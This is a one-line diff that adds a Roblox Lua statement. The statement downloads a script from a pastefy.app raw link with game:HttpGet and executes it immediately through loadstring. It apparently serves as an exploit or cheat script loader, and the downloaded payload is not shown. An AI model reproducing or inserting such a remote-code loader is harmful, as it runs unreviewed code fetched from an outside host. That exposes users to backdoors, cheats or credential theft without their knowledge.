@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://pastefy.app/xA5svQqg/raw'),true))()
